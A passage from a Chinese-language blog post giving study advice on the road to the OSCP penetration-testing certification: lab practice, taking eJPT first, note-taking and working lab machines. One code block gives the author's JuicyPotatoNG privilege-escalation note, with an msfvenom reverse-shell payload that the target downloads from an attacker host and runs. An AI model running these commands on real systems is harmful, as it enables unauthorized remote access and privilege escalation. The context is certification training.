另外，OSCP 是一個絕對的高壓考試環境，考生必須看遍所有枝微末節的地方並找到可能的突破口，由於 HackTheBox 的難度我們很難在這個階段就用我們所學的知識涵蓋到所有內容，變成每個靶機都碰壁，非常挫折，這也導致容易培養出一個壞習慣是一但遇到問題就假設自己不會進而直接去看答案，這將會非常不利於後續進行 OSCP 的考試。如果要說的話，我會覺得一旦碰壁之後不要給自己設定一個時間限制，像是說30分鐘還是解不出來就去看答案，這樣很容易拖到30分鐘。而是不設限時間，並反覆地將自己所學的東西一一參照後再去試著看看題目的內容。過程中不斷並參照網路或是其他資料我覺得會是一個相對比較好的做法。

### 2. 先去試著取得入門級證照 eJPT 後再取得 OSCP

關於這章比較可惜的是我人**並沒有**嘗試過這個路線，而是要是能重來我會選擇這樣來進行，所以下面的部分會比較不嚴謹也比較多猜測性的內容。在上面我們提到了 HackTheBox 的難度及學習過程的混雜讓我們難以銜接上 OSCP 的高壓環境與考試難度。除了 HackTheBox 之外，如同第一章的表跟最上面那個路線圖，我們有很多相較於 OSCP 之外比較入門的滲透測試證照選擇。我比較建議先去取得入門證照後進行 OSCP，我們先來看看 [eJPT 的課綱](https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student)。

1. SECTION 1 Assessment Methodologies
2. SECTION 2 Host & Networking Auditing
3. SECTION 3 Host & Network Penetration Testing
4. SECTION 4 Web Application Penetration Testing

這邊就不詳細地把所有東西都列出來了，但我們可以看到 eJPT 的流程是相對針對於滲透測試也相對嚴謹不少的，從對目標進行偵察開始，講到從網路、網頁進行滲透測試，內容雖然沒有那麼廣泛，但可以很好的給我們一個概覽關於滲透測試要做什麼，也就是有一個媒介讓我們先前學到的知識進行統整與固化。學習完 TryHackMe 之後，大部分的人對於滲透測試的理解應該還是相對薄弱的，只知道大概的「流程」而並非知道滲透測試具體所需要的知識。透過 eJPT 或是其他入門證照上面的課程可以幫助整理、鞏固先前學到的知識，同時也會以練習的方法去指導如何實際運用。

再者有一點蠻重要的是可以體驗考試。儘管根據網路上的心得，eJPT 不管是考試難度還是價格都是相對比 OSCP 低不少，但這並不是壞事，透過考 eJPT 可以先體驗看看考證照是什麼樣的感覺，避免一考 OSCP 的時候因為太緊張、沒有經驗而導致很多失誤。

這邊就講得比較短，關於 eJPT 網路上應該也有不少心得文可以看，主要的點還是在於說透過 HackTheBox 的銜接有點不太系統化，如果先考 eJPT 的話整體的學習曲線都會比較緩一點，相對起來壓力也不會那麼大。再上完 eJPT 之後如果覺得還不夠，回到上面的 HackTheBox 的練習也不遲。

### 3. 直接進行 OSCP 的訓練

如果常爬 reddit 的話會發現上面很多人都是這樣，說自己頭很鐵直接報名 OSCP，然後每天下班寒窗苦讀三個月，第一次考試就考過。坦白講，當初我也是信了我也才毅然決然地報，想說我上我也行，結果大家都在先前的文章看到的，我考試考了兩次才過，我還是有先經過 HackTheBox 的練習的。關於想這樣做的同學，倒也不是說不行，我這邊簡單給幾個前提可以參考一下，要不就是有人帶，要不就是你本身就懂很多，不然我真的不建議。

1. 你有個導師，導師可以隨時隨地指點你
2. 你參加了有人教導的密集訓練課程
3. 你已經會很多網路、系統的知識，熟悉 Linux、Active Directory
4. 你已經很熟悉資安，對於滲透測試已經具有一定的理解

如果你像我一樣是個從 TryHackMe 學上來的小白，直接走這條路會非常辛苦。直接上 OSCP 意味著要在短時間內學習大量的滲透測試知識並運用於類似實務的環境。這非常具有挑戰性，如果你很有時間我也建議可以先把基礎夯實再走，不然很有可能到頭來一場空，東西沒學好，考試也考不過。

## 一些關於學習上的小技巧

花點時間來聊聊學習上的小技巧，也就是怎麼讓自己的學習更加順利的幾個小方法。除了吃飽跟睡飽之外，還有一些我覺得可以讓自己進步得更快，或是更有系統性的整理知識的方法。

### 自己做筆記

在各種各樣的課堂上我們會學到各種攻擊手法，關於攻擊手法的筆記，當然網路上有很多像是 [HackTricks](https://book.hacktricks.xyz/) 都有一些完整的內容，但我還是覺得要自己整理。自己寫下來的好處非常多。最主要的點是，要運用網路上既有的手法是很困難的。舉例來說像是我們在 HackTricks 看到 UAC Bypass 的方法，我們照著執行了，但什麼事情都沒發生。有可能的原因有好幾個。

1. 你確定現在有 UAC 打開嗎?
2. 現在的 User 沒有權限的問題是因為 UAC嗎?
3. 你所複製的手法具體的內容跟你現在的情況符合嗎?

我們會知道問題是從偵查開始一步步疊加而成的，會需要那個手法的原因是你只是「剛好忘記」具體的執行方式怎麼弄，而不是在亂槍打鳥覺得自己應該要怎麼做。這也是為什麼自己做筆記很好的一點，因為你會知道上面的東西都是你知道的，而你只是需要個地方把他記下來，這也是自己紀錄的意義。當然遇到不會的也一定要上網查，但自己的筆記也會比較符合自己的使用習慣，通常都會很清楚要怎麼弄，像是這是我自己做的 JuicyPotatoNG (SeImpersonatePrivilege) 用法的筆記。

```powershell
# jpng.exe

msfvenom --payload windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9889 -e x64/shikata_ga_nai --format exe -o tcp9889.exe

cp /opt/JuicyPotatoNG.exe ./JuicyPotatoNG.exe

python3 -m http.server 80

iwr 10.10.14.23/JuicyPotatoNG.exe -o C:\\programdata\\JuicyPotatoNG.exe
iwr 10.10.14.23/tcp9889.exe -o c:\\programdata\\tcp9889.exe

rlwrap nc -lvnp 9889

C:\\programdata\\JuicyPotatoNG.exe -t * -p 'C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe' -a '-c C:\\programdata\\tcp9889.exe'
```

透過自己寫的東西，可以很快地達成自己要的目的，避免重複性的手打也避免筆誤犯錯(不要不信，真的很常發生)。

此外補充一下關於課堂的筆記，課堂的筆記我覺得有點玄之又玄，常常寫下來也不知道自己在寫什麼，我覺得還是把關鍵的指令記錄下來就好，有遇到問題，翻回去再查，把知識點一個一個寫下來通常也起不了什麼特別的作用。滲透測試的練習很少會去翻書溫習像是 UAC Bypass 的原理是什麼，知道第一次之後接下來都是實戰比較多。

### 如何打靶機

關於如何打靶機，我必須醜話先講在前頭，我並不是一個特別會打靶機的人，所以這個部分就看看就好。那至於為什麼要特別拉出來講是因為，靶機大概佔了整體學習時間的 50~80%，幾乎所有時間都在打靶機。打靶機有幾個重點要注意。

1. 做筆記。關於筆記的內容可以包羅萬象，但做筆記非常非常非常重要，可以省下很多重複性的麻煩。將自己已經做過的事情記錄下來可以避免自己撞牆之後再去撞一次，最關鍵的是，**後續才可以知道自己有什麼事情沒做**。如果沒做筆記的話，常常在檢討的時候就只會覺得「噢，原來這邊可以這樣做」而不是「我的流程裡面缺少了某個部分」。關於學習筆記可以看 OffSec S1ren 的 walkthrough，她的筆記做得相當好，千萬別學 ippsec 那樣，他很多時候都是已經打完再回頭講解的，不是第一次就打得那麼好然後什麼都不用寫。
2. 耐心。這邊就不重複 OffSec 的名言 Try Harder 了。但耐心是相當重要的，把關鍵的資料看過一遍再一遍，確認自己沒有任何遺漏之後再前進。
3. 上網找資料。遇到不會的問題的時候，把各種可能性餵給 Google，你會很意外 Google 能解決問題的機率高得離奇。
4. 休息。卡住了適當的休息，走走，整理筆記都是很好的手段，有時候一頭栽進去反而容易見木不見林。
5. 檢討。如同上方 ippsec 在 X 上所說的，「練習並不能造就完美，完美的練習才能造就完美」，花更多時間檢討並把這次沒做好的東西學起來，或是把已經做好的東西做得更好是進步的關鍵。
6. 寫 write-up。我沒什麼資格講這個畢竟我也寫得很少，但透過寫作的過程是可以把 1-5 全部實踐並且精進的方法，我強烈建議有空的話就把 write-up 寫起來放。

差不多是這樣，歡迎補充。

## 小結

這是一個相對長的文章，內容整理了我從零開始一路學到 OSCP 的學習過程及心路歷程，從什麼都不會開始慢慢地堆砌自己的技能，最後到簽下 OSCP 的課程。依舊特別值得一筆的是，這篇文章所講的流程幾乎不需要任何先備知識，畢竟我也不是本科系出身的，所以很適合各式各樣願意踏入滲透測試的人們閱讀。也謝謝各位看到這邊，有關下一章的 OSCP 的文章已經在[之前的文章](https://peterkan.tw/2024/02/15/all-about-oscp/)寫好了，有興趣的朋友務必前去一覽。下一篇是關於我考到 OSCP 的後續在做什麼，由於還在持續進行中，應該會要好一陣子才會出來，也請各位拭目以待，但我學校越來越忙了，有點難產呀。

---

感謝閱讀，本文同步發表於FB粉絲專頁 [PP學習筆記](https://www.facebook.com/pplearningnote)。